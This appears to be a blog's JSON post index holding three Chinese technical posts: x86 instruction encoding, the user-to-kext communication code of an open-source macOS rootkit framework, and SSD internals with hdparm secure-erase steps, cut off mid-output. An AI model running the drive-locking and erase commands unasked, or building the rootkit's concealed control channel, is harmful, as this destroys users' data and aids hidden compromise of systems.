[{"title":"X86指令编码笔记","date":"2017-10-11T03:46:13.000Z","path":"2017/10/11/x86指令编码笔记/X86指令编码笔记/","text":"由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。 x86指令编码格式很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。 x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了Intel 64和IA-32架构下的指令格式，当然，这两种架构所采用的都是x86指令编码： 从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。 指令prefixprefix简单的说来就是调整内存操作数属性，增强指令的作用等。 lock 和 repeat 其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。 operand-size override （66H — 改变默认操作数大小） 这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。 address-size override （67H — 改变默认操作数地址大小） 这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。 segment override，branch hints 和 bound 其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。 | 2E | 3E | 26 | 64 | 65 | 36 || ———– | ———– | ———– | ———– | ———– | ———– || CS register | DS register | ES register | FS register | GS register | SS register | REX prefix—开启 64 位计算的基石REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个） 7 6 5 4 3 2 1 0 0 1 0 0 W R X B W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size R: 用来扩展 ModRM.reg 域 X: 用来扩展 SIB.index 域 B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg 寄存器编码表 下面来分析这条指令： mov eax,ebx 正常编码为：89 d8 下面看看在不同的REX.W和66H prefix下的不同： 48 89 d8——————&gt; mov rax,rbx 66 48 89 d8—————&gt; mov rax,rbx 66 40 89 d8—————&gt; mov ax, bx ​ 第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，REX.W = 1 第 2 条指令编码加上了 66H prefix 同时还有 REX prefix（REX.W = 1），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？实际上，很简单！48H 位于 66H 后面，66H 将被覆盖！也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 operand size 是 64 位的。 第 3 条指令编码也同样使用了 66H prefix 和 REX prefix，但是 REX.W = 0 意味着不改变原来的 operand size！在这种情况下，REX prefix 不会与 66H prefix 产生冲突，最终的作用于 66H prefix，因此 operand size 是 16 位的。 opcode整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。 一个opcode可以由一个byte组成，我们称之为1-byte opcode，当然，与之对应的，就有2-bytes opcode和3-bytes opcode。其中，后两者一般会有一个被称为escape opcode的byte进行引导，该byte的数值是0FH。所以，一般情况下，2-bytes opcode就是0FH后面再加一个byte，而3-bytes opcode就是0FH后面再加两个bytes。 ModR/MModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。 由一个byte组成，其格式如下： 7 6 5 4 3 2 1 0 mod reg R/M 1、mod：寻址模式。 2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。 mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式： mod = 00，定义 [register] 间接寻址，无displacement值。 mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。 mod = 10，定义 [register + disp32]，有32位displacement偏移值。 2、reg：寄存器ID值 3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。 reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。 3、r/m：意即register / memory。 ​ 提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。 注意: (1) 如果像这条指令：mov eax, [eax+ecx2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+indexscale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。 原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。 (2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。 Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。 SIBSIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。 7-6 5-4-3 2-1-0 scale index base index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。 Displacement 和 Immediate某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。 综合起来，看下面的例子： 49 8b 7d 00 49=0100 1001对应REX prefix,默认64为size模式 8b= mov opcode 7d=01 111 101—&gt;ModR/M mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13 00=Displacement = 0 所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13] ​ 参考及索引http://ref.x86asm.net/coder32.html —-&gt; 查阅opcode http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png —&gt;quick look Intel x86 Assembler Instruction Set Opcode Table http://www.mouseos.com/x64/index.html https://bbs.pediy.com/thread-78121.htm X86指令编码的那些事儿 http://subler.github.io/note/compiler/x86_instruction_encode.html onlineDisassembler","tags":[{"name":"x86","slug":"x86","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"}]},{"title":"一种用户层与kext内核扩展交互方式","date":"2017-08-10T07:59:00.000Z","path":"2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/","text":"最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。简单说下rootKit原理：利用kext驻留在内核，完成实际的各种功能：sys_ptrace过滤 PT_DENY_ATTACH反调试hook系统调用防止sys_kil（很强大有木有）隐藏自身进程，文件监控，网络监控，提权等等可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。 0x01 一个例子进入kext开发在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。 打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下 1234567891011121314#include &lt;mach/mach_types.h&gt;#include &lt;libkern/libkern.h&gt;kern_return_t TestExtension_stop(kmod_info_t *ki, void *d);kern_return_t TestExtension_start(kmod_info_t * ki, void *d)&#123; printf(\"hello kext!\\n\"); return KERN_SUCCESS;&#125;kern_return_t TestExtension_stop(kmod_info_t *ki, void *d)&#123; printf(\"bye kext!\\n\"); return KERN_SUCCESS;&#125; 其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。 简单编译一下，然后找到编译后的kext文件，输入命令改变权限 sudo chown -R root:wheel TestExtension.kext 再输入 sudo kextload TestExtension.kext 加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令 sudo kextunload TestExtension.kext 来卸载该内核扩展，你同样会看到bye kext这句话。 0x02 用户层与内和扩展间的交互下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用PF_SYSTEM协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。 kext 示例代码1234567891011121314151617181920212223242526272829303132333435#include &lt;sys/systm.h&gt;#include &lt;mach/mach_types.h&gt;#include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt;//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;char name[] = \"com.example.mymodule\" ;//标识这个kextstruct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data)&#123; int err ; struct kern_ctl_reg ctlreg ; bzero(&amp;ctlreg, sizeof(ctlreg)) ; //控制信息 ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */ ctlreg.ctl_unit = 0 ; strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name)); //回调函数 ctlreg.ctl_connect_func = connect ; ctlreg.ctl_disconnect_func = disconnect ; ctlreg.ctl_send_func = send ; ctlreg.ctl_getopt_func = getopt ; ctlreg.ctl_setopt_func = setopt ; //注册内核控制 err = ctl_register(&amp;ctlreg, &amp;_ctlref) ; if (err) return KERN_FAILURE ; return KERN_SUCCESS ;&#125; 下面解释下其中的kern_ctl_ref数据结构 12345678910111213141516171819struct kern_ctl_reg&#123; /* 控制信息 */ char ctl_name[MAX_KCTL_NAME]; u_int32_t ctl_id; u_int32_t ctl_unit; /* 控制设置 */ u_int32_t ctl_flags; u_int32_t ctl_sendsize; u_int32_t ctl_recvsize; /* 回调函数 */ ctl_connect_func ctl_connect;//建立连接时调用 ctl_disconnect_func ctl_disconnect;//断开连接时调用 ctl_send_func ctl_send;//处理从client到kernel的数据发送 ctl_setopt_func ctl_setopt; //当client调用setsockopt时调用 ctl_getopt_func ctl_getopt;//当client调用getsockopt时调用&#125;; client 示例代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;socket.h&gt;#include &lt;string.h&gt;#include &lt;sys/kern_control.h&gt;#include &lt;sys/ioctl.h&gt;char name[] = \"com.example.mymodule\" ;//标识这个kextstatic int g_socket = -1;u_int32_t getctlidbybame(int sock, char *name) ;//建立连接int socket_ctl(char *name)&#123; int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ; if (g_sock == 0) return 0 ; u_int32_t id = getctlidbyname(g_sock, name) ; sockaddr_ctl addr ; addr.sc_len = sizeof(addr) ; addr.sc_family = AF_SYSTEM ; addr.sc_sysaddr = AF_SYS_CONTROL ; addr.sc_id = id ; addr.sc_unit = 0 ; /* allocate dynamically */ int err ; err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ; if (err) return 0 ; return sock ;&#125;u_int32_t getctlidbybame(int sock, char *name)&#123; struct ctl_info info ; memset(&amp;info, 0, sizeof(info)) ; strncpy(info.ctl_name, name, strlen(name)) ; int err = ioctl(sock, CTLIOCGINGO, &amp;info) ; if (err) return 0 ; /* should do something stronger here! */ return info.ctl_id ;&#125;int main(int argc, const char *argv[])&#123; socket_ctl(name);&#125;//发送数据void execute_cmd(int cmd, char *args)&#123; char data[32] = &#123; 0 &#125;; size_t data_len = 0; int retv; if(args != NULL) &#123; memcpy(data, args, strlen(args)); &#125; data_len = strlen(data) + 1; retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len); if(retv != 0) &#123; printf(\"[ERROR] Kernel command execution failed:\\n\"); printf(\"\\t%s (%d)\\n\", strerror(errno), errno); return; &#125;&#125;//接收数据void get_data()&#123; char *data = malloc(32); socklen_t data_len = 32; int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len); if(retv != 0) &#123; printf(\"[ERROR] getsockopt()\\n\"); return; &#125; size_t r = recv(g_socket, data, data_len, 0); if(r == 0) &#123; printf(\"[ERROR] recv()\\n\"); return; &#125;&#125; 代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。 0x03 总结在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续… 0x04 参考 http://www.tanhao.me/pieces/1515.html/ https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html https://github.com/enzolovesbacon/inficere","tags":[{"name":"kext","slug":"kext","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"}]},{"title":"浅谈SSD与安全擦除","date":"2017-08-08T06:27:59.000Z","path":"2017/08/08/浅谈SSD与安全擦除/SSD与安全擦除/","text":"SSD与安全擦除 目录0x01 SSD简介0x02 SSD安全擦除原理及工具0x03 参考 0x01 SSD简介1.1 SSD的组成结构SSD 的关键部件由控制器和存储单元两部分组成。除此之外，还有缓存和主机接口。 控制器每个 SSD 都有一个控制器(controller)将存储单元连接到电脑。控制器是一个执行固件(firmware)代码的嵌入式处理器。主要功能如下： 错误检查和纠正(ECC) 磨损平衡(Wear leveling) 坏块映射(Bad block mapping) read disturb(读取某个块的数据的时候会影响到相邻块的数据)管理 缓存控制 垃圾回收 加密 存储单元SSD固态硬盘，存储介质和机械硬盘完全不同，其依靠三极管的充放电实现，而非磁场。目前，介质主要有三种：SLC，MLC和TLC SLC=Single-LevelCell，即1bit/cell，速度快寿命长，价格超贵（约MLC3倍以上的价格），约10万次擦写寿命 MLC=Multi-LevelCell，即2bit/cell，速度一般寿命一般，价格一般，约3000—10000次擦写寿命 TLC=Trinary-LevelCell，即3bit/cell，也有Flash厂家叫8LC，速度慢寿命短，价格便宜，约500次擦写寿命。 每cell可存储的比特位表示了存储的能力，可以看出TLC的每cell存储能力最强，一个cell可以存储3比特，但相对的，TLC的寿命最短，即可擦写次数最少。当擦写次数达到寿命值时，读写数据将不再有效，具体的寿命可以参考具体闪存颗粒数据手册。 在机械硬盘上，由于机械硬盘的数据可以直接覆盖，所以LBA和PBA(Physical Block Address)的关系是1:1对应，不会变更，即LBA=PBA。但在SSD上，这种关系就变得复杂了，原因是SSD使用的存储介质NAND闪存有需要先擦除才能再写入，因为读写以页为单位，擦除以块（多个页组成）为单位的特性，导致LBA和PBA的关系不再是固定不变的。NAND闪存的擦除/写入关系请参考下图： 缓存基于 NAND 闪存的 SSD 通常带有一个基于 DRAM 的缓存，其作用与普通的机械式硬盘类似，但是还会存储一些诸如 Wear leveling 数据之类的其他数据。把数据先缓存在 DRAM 中，然后集中写入，从而减少写入次数。特例之一是 SandForce 生产的控制器，它并不含有缓存，但是性能依旧很出色，由于其结构简单，故而可以生产体积更小的 SSD，并且掉电时数据更安全。 主机接口主机接口与控制器紧密相关，但是通常与传统的机械式硬盘相差不大，主要有以下几种： SATA SAS PCI-E Fibre Channel USB 主机接口的速度限制了 SSD 所能达到的速度峰值。但是一般这并不是瓶颈所在。 1.2 SSD 技术解析FTL（Flash translation layer）前面说过，闪存的读写单位为页，而页的大小一般为4KB或8KB，但我们的操作系统读写数据是按机械硬盘的扇区尺寸进行的（512Byte），更麻烦的是闪存擦除以块作单位，而且未擦除就无法写入，这导致操作系统现在使用的文件系统根本无法管理SSD，需要更换更先进、复杂的文件去解决这个问题，但这样就会加重操作系统的负担。 为了不加重操作系统的负担，SSD采用软件的方式把闪存的操作虚拟成磁盘的独立扇区操作，这就是FTL。因FTL存在于文件系统和物理介质（闪存）之间，操作系统只需跟原来一样操作LBA即可，而LBA到PBA的所有转换工作，就全交由FTL负责。 FTL算法，其实就是一种LBA到PBA的映射。当文件系统发送指令要写入或者更新一个特定的逻辑页时，FTL实际上是把数据写入到一个不同的空闲物理页并更新映射表（LBA和PBA的关联数据），并把这个页上包含的“旧数据”标记为“无效”（更新后的数据已经写入新的PBA，旧地址的数据自然就失效了）。正是因为FTL的存在，操作系统才能把SSD当成HDD那样操作，因此FTL转换的性能也就直接影响SSD的性能表现。 我们现在看上图，假设在page0上写入数据(物理地址n）,接下来写入数据到page1(物理地址n+1)。接着page0数据被更新，但是更新后的数据并不是覆盖上去，FTL会把它写入到地址(n+2)上，然后标记(地址n)为“无效”。经过多次这样的操作后，这个块上就会装满了许多“有效”及“无效”的数据。如果要再次写入到这个块，就需要先擦除整个块的数据，当然就需要先把所有“有效”的数据复制到另外的空白块上再进行擦除。这样的操作就是GC（Garbagecollection）垃圾回收。 WL（Wear leveling）磨损平衡简单说来，磨损平衡是确保闪存的每个块被写入的次数相等的一种机制。 通常情况下，在 NAND 块里的数据更新频度是不同的：有些会经常更新，有些则不常更新。很明显，那些经常更新的数据所占用的块会被快速的磨损掉，而不常更新的数据占用的块磨损就小得多。为了解决这个问题，需要让每个块的编程(擦写)次数尽可能保持一致：这就是需要对每个页的读取/编程操作进行监测，在最乐观的情况下，这个技术会让全盘的颗粒物理磨损程度相同并同时报废。 磨损平衡算法分静态和动态。动态磨损算法是基本的磨损算法：只有用户在使用中更新的文件占用的物理页地址被磨损平衡了。而静态磨损算法是更高级的磨损算法：在动态磨损算法的基础上，增加了对于那些不常更新的文件占用的物理地址进行磨损平衡，这才算是真正的全盘磨损平衡。简单点说来，动态算法就是每次都挑最年轻的 NAND 块来用，老的 NAND 块尽量不用。静态算法就是把长期没有修改的老数据从一个年轻 NAND 块里面搬出来，重新找个最老的 NAND 块放着，这样年轻的 NAND 块就能再度进入经常使用区。概念很简单，但实现却非常的复杂，特别是静态。 尽管磨损均衡的目的是避免数据重复在某个空间写入，以保证各个存储区域内磨损程度基本一致，从而达到延长固态硬盘的目的。但是，它对固态硬盘的性能有不利影响。 GC（Garbagecollection）垃圾回收所谓GC就是把一个闪存块里的‘有效’页数据复制到一个‘空白’块里，然后把这个块完全擦除。GC是SSD里的一个非常关键的操作，其效率对性能有决定性影响。闪存块里‘有效’页的数量对GC效率有决定性的影响，因数量越少，需要复制的页就越少， 花费的时间也越少，效率就高了。 下图是把X块和Y块里的“有效”页复制到N块里，然后擦除X和Y以作备用的“空白块” 有三种垃圾回收策略： 闲置垃圾回收：很明显在进行垃圾回收时候会消耗大量的主控处理能力和带宽造成处理用户请求的性能下降，SSD 主控制器可以设置在系统闲置时候做“预先”垃圾回收(提前做垃圾回收操作)，保证一定数量的”备用空白块”，让 SSD 在运行时候能够保持较高的性能。闲置垃圾回收的缺点是会增加额外的”写入放大”，因为你刚刚垃圾回收的”有效数据”，也许马上就会被更新后的数据替代而变成”无效数据”，这样就造成之前的垃圾回收做无用功了。 被动垃圾回收：每个 SSD 都支持的技术，但是对主控制器的性能提出了很高的要求，适合在服务器里用到，SandForce 的主控就属这类。在垃圾回收操作消耗带宽和处理能力的同时处理用户操作数据，如果没有足够强劲的主控制器性能则会造成明显的速度下降。这就是为啥很多 SSD 在全盘写满一次后会出现性能下降的道理，因为要想继续写入数据就必须要边垃圾回收边做写入。 手动垃圾回收：用户自己手动选择合适的时机运行垃圾回收软件，执行垃圾回收操作。 可以想象，如果系统经常进行垃圾回收处理，频繁的将一些区块进行擦除操作，那么 SSD 的寿命反而也会进一步下降。由此把握这个垃圾回收的频繁程度，同时确保 SSD 中的闪存芯片拥有更高的使用寿命，这确实需要找到一个完美的平衡点。所以，SSD 必须要支持 Trim 技术，不然 GC 就显不出他的优势了。 TrimTrim 是一个 ATA 指令，当操作系统删除文件或格式化的时候，由操作系统同时把这个文件地址发送给 SSD 的主控制器，让主控制器知道这个地址的数据无效了。 当你删除一个文件的时候，文件系统其实并不会真正去删除它，而只是把这个文件地址标记为“已删除”，可以被再次使用，这意味着这个文件占的地址已经是“无效”的了。这就会带来一个问题，硬盘并不知道操作系统把这个地址标记为“已删除”了，机械盘的话无所谓，因为可以直接在这个地址上重新覆盖写入，但是到了 SSD 上问题就来了。NAND 需要先擦除才能再次写入数据，要得到空闲的 NAND 空间，SSD 必须复制所有的有效页到新的空闲块里，并擦除旧块(垃圾回收)。如果没有 Trim 指令，意味着 SSD 主控制器不知道这个页是“无效”的，除非再次被操作系统要求覆盖上去。 Trim 只是条指令，让操作系统告诉 SSD 主控制器这个页已经“无效”了。Trim 会减少写入放大，因为主控制器不需要复制“无效”的页(没 Trim 就是“有效”的)到空白块里，这同时代表复制的“有效”页变少了，垃圾回收的效率和 SSD 性能也提升了。 Trim 能大量减少伪有效页的数量，它能大大提升垃圾回收的效率。 目前，支持 Trim 需要三个要素，缺一不可： 系统： 操作系统必须会发送 Trim 指令，Win7, Win2008R2 , Linux-2.6.33 以上。 固件： SSD 的厂商在固件里要放有 Trim 算法，也就是 SSD 的主控制器必须认识 Trim 指令。 驱动： 控制器驱动必须要支持 Trim 指令的传输，也就是能够将 Trim 指令传输到 SSD 控制器。MS 的驱动，Intel 的 AHCI 驱动目前支持。别的要看之后的更新了。目前，RAID 阵列里的盘明确不支持 TRIM，不过 RAID 阵列支持 GC。 OP（Over-provisioning）预留空间SSD上的OP指的是用户不可操作的容量，大小为实际容量减去用户可用容量，OP区域一般被用于优化操作如：WL，GC和坏块映射等。OP一般分三层（见下图）。第一层容量固定为SSD标称容量的7.37%，这是因为标称容量采用千进制为单位，而NAND颗粒容量单位为1024进制，两者正好相差约7.37%。这部分空间被默认用于作OP。第二层OP是否存在及容量大小取决于厂商设置。第三层OP是用户在日常使用中可以分配的，像Fusion-IO公司还给其用户提供工具让他们自行调节大小以满足不同的耐用度及性能要求，一般用户也可以自己在初次分区的时候，不把所有的SSD容量都分满来达到相同目的，此处有一点要注意，若非首次分区就留出空间，必须要先进行全盘擦除，否则没有效果。 虽然OP会减少SSD的可用容量，但有减少WA、提高寿命、性能的正面作用。请看下图：两个相同的64G SSD，左边的分区50G，右边的全部容量分区。格式化后容量分别为：46G和59G左右。 我们知道在操作系统下,要写入共59G的数据时，左边的盘必须删除13G的‘无效’数据才行。右边的盘不需擦除就能写入所有59G数据，由SSD映射表的操作方式可知，删除后继续写入的数据在物理上会继续写入整个盘（写入OP1和OP2），在LBA上会覆盖被删除数据的地址。也就是说，同样写入59G数据，左边的盘已经包含了13G“无效”数据了。（那些被重映射到预留空间的数据，原地址数据就是“无效”、“过期”的）。所以说图中SSD里LBA上数据“有效”的机会比右边要少，因为LBA容量小(分区小)，所以在做垃圾回收处理时，需要复制的“有效”数据也少了，自然效率就提高了。一般来说，建议在不支持Trim或对SSD的性能有较高要求的时候，如数据库等类的应用，增加一定比例的第三层OP容量（此空间需要先做HDD ERASE，保证没有被使用过），可以很好的起到保持速度，提高寿命的作用。（如必须用SSD组建RAID时，强烈建议留部分OP容量以弥补没有Trim产生的影响。） WA（Write Amplification）写入放大WA是闪存及SSD相关的一个极为重要的属性。由于闪存必须先擦除才能再写入的特性，在执行这些操作时，数据都会被移动超过1次。这些重复的操作不单会增加写入的数据量，还会减少闪存的寿命，更吃光闪存的可用带宽而间接影响随机写入性能。举个最简单的栗子：当要写入一个4KB的数据时，最坏的情况是一个块里已经没有干净空间了，但有无效的数据可以擦除，所以主控就把所有的数据读到缓存，擦除块，缓存里更新整个块的数据，再把新数据写回去，这个操作带来的写入放大就是: 实际写4K的数据，造成了整个块（共1024KB）的写入操作，那就是放大了256倍。同时还带来了原本只需要简单一步写入4KB的操作变成：闪存读取 (1024KB)→缓存改（4KB）→闪存擦除（1024KB）→闪存写入（1024KB），共四步操作，造成延迟大大增加，速度变慢。所以说WA是影响 SSD随机写入性能和寿命的关键因素。 以100%随机4KB来写入，目前的大多数SSD主控，在最坏的情况下WA可以达到100以上。如果是100%持续的从低LBA写入到高LBA的话，WA可以做到1，实际使用中写入放大会介于这两者之间。用户还可以设置一定的OP（预留空间）来减少WA，假设你有个128G的SSD，你只分了64G 的容量使用，那最坏情况下的写入放大就能减少约3倍。许多因素影响SSD的WA。下面列出主要的因素，以及它们如何影响WA。 垃圾回收（GC）— 虽然增加了写入放大，但是速度有提升。 这个比较特殊的算法用来移动，合并，擦除闪存块来提升效率。（详见GC章节） 预留空间（OP）— 减少写入放大。（预留空间越大，写入放大越低） 在SSD上划出部分空间留给主控做优化，是用户不能操作的空间。（详见OP章节） Trim 开启后可以减少写入放大。 一个ATA指令，由操作系统发送给SSD主控，告诉主控哪些数据是无效的并且可以不用做垃圾回收操作。（详见Trim章节） 可用容量减少写入放大。（可用空间越大，写入放大越低） 用户使用中没有用到的空间。（需要有Trim支持，不然不会影响写入放大。） 安全擦除 Secure Erase 减少写入放大， ATA安全擦除命令用来清除在磁盘上的所有用户数据，这个指令会让SSD回到出厂时的性能（最优性能，最少写入放大），但是随着使用时间变长，GC操作恢复后，写入放大又会慢慢增加回来。许多软件使用ATA安全擦除指令来重置磁盘，最著名的为HDDErase。对SSD来说，重置就是（除了OP区域内的部分私有区域外的）全盘擦除操作，瞬间即可完成清除所有数据让SSD回到初始状态。但要注意，每操作一次，全盘寿命P/E次数减1。 持续写入（Sequential writes）减少写入放大。理论上来说，持续写入的写入放大为1，但是某些因素还是会影响这个数值。 静态/动态数据分离（Separating Static and Dynamic Data）减少写入放大。高端SSD主控制器支持静态和动态数据的分离处理，此操作要求SSD主控制器对LBA里经常写入（动态数据，热数据）和不经常写入（静态数据，冷数据）的数据块进行归类，因为如果块里同时包含了静态和动态数据，在做GC操作的时候会为了改写其实没必要的静态数据而增加写入放大，所以把包含静态数据的块归类后，因为不常改写，写入放大就减少了。但是迟早SSD主控会把这些静态的数据转移到别的地方来进行磨损平衡。（因为静态数据占着的数据块一直不改写，编程次数低于平均值的话，会造成颗粒磨损不平衡，违背了磨损平衡，确实非常矛盾的。） 随机写入（Random writes）提高写入放大，不好 随机写入会写入很多非连续的LBA，将会大大提升写入放大。 磨损平衡（WL）直接提高写入放大，不好 确保闪存的每个块被写入的次数相等的一种机制。 BBM（Bad Block Management）坏块管理不管磨损平衡算法如何聪明，在运作中都会碰到一个头痛的问题，那就是坏块，所以一个SSD必须要有坏块管理机制。何谓坏块？一个NAND块里包含有不稳定的地址，不能保证读/写/擦的时候数据的准确性。其概念和传统机械式硬盘的坏块相似。 坏块分出厂坏块和使用过程中出现的坏块，和机械式硬盘的坏块表一样(P表和G表)，SSD也有坏块表。出厂坏块的话，在坏块上会有标记，所以很容易就能被识别，后期使用中出现的坏块就要靠主控制器的能力了，一般来说，越到NAND生命的后期(P/E数开始接近理论最大值)，坏块就会开始大量出现了。NAND出厂前都会被执行擦除操作，厂商会在出货前会把坏块标记出来(厂商会在坏块的第一个页的SA区上打上标记)。这样坏块管理软件就能靠监测SA区标记来制作坏块表。SA区的意思是页中4096~4319的区域，用户不可访问，主要用来存放ECC算法、坏块信息、文件系统资料等。由于在使用中会产生坏块，所以SSD的每次编程/擦除/复制等操作后都要检查块的状态。对颗粒的ECC要求也要达到厂商的标准以上(主控强不强，看ECC能力也是一个参考)。 ECC（Error Checking and Correction）校验和纠错ECC的全称是Error Checking and Correction，是一种用于Nand的差错检测和修正算法。由于NAND Flash的工艺不能保证NAND在其生命周期中保持性能的可靠，因此，在NAND的生产中及使用过程中会产生坏块。为了检测数据的可靠性，在应用NAND Flash的系统中一般都会采用一定的坏区管理机制，而管理坏区的前提是能比较可靠的进行坏区检测。如果操作时序和电路稳定性不存在问题的话，NAND Flash出错的时候一般不会造成整个Block或是Page不能读取或是全部出错，而是整个Page中只有一个或几个bit出错，这时候ECC就能发挥作用了。不同颗粒有不同的基本ECC要求，不同主控制器支持的ECC能力也不同，理论上说主控越强ECC能力越强 0x02 SSD安全擦除原理和工具ATA安全擦除命令用来清除在磁盘上的所有用户数据，这个指令会让SSD回到出厂时的性能（最优性能，最少写入放大），但是随着使用时间变长，GC操作恢复后，写入放大又会慢慢增加回来。许多软件使用ATA安全擦除指令来重置磁盘，最著名的为HDDErase。对SSD来说，重置就是（除了OP区域内的部分私有区域外的）全盘擦除操作，瞬间即可完成清除所有数据让SSD回到初始状态。但要注意，每操作一次，全盘寿命P/E次数减1。 使用hdparm进行安全擦除步骤Step 1 - 确保驱动器安全未冻结：发送以下命令，X为对应的设备（如sda） hdparm -I /dev/X 命令输出（确保驱动器”not frozen”）： 123456789Security: Master password revision code = 65534 supported not enabled not locked [ not frozen ] not expired: security count supported: enhanced erase 2min for SECURITY ERASE UNIT. 2min for ENHANCED SECURITY ERASE UNIT. 如果命令输出显示为”frozen”，那么不能继续下一步。如果您的驱动器被冻结并启用了密码，请尝试使用BIOS删除密码，并关闭系统电源，看看是否禁用冻结。否则，您可能需要使用不同的主板（使用不同的BIOS）。 Step 2 - 通过设置用户密码启用安全性：警告：设置用户密码后，下一次上电后驱动器将被锁定（只有使用正确的密码解锁，不然驱动器将拒绝正常访问）。 Step 2a - 设置用户密码：任何密码都可以，因为这只能是临时的。安全擦除后，密码将设置为NULL。在这里，我们将使用密码“Eins”。 hdparm --user-master u --security-set-pass Eins /dev/X 命令输出: 1234security_password=\"Eins\"/dev/sdd:Issuing SECURITY_SET_PASS command, password=\"Eins\", user=user, mode=high Step 2b - 成功后然后执行hdparm -I /dev/X 命令输出(应显示为”enable”)： 12345678910Security: Master password revision code = 65534 supported [ enabled ] not locked not frozen not expired: security count supported: enhanced erase Security level high 2min for SECURITY ERASE UNIT. 2min for 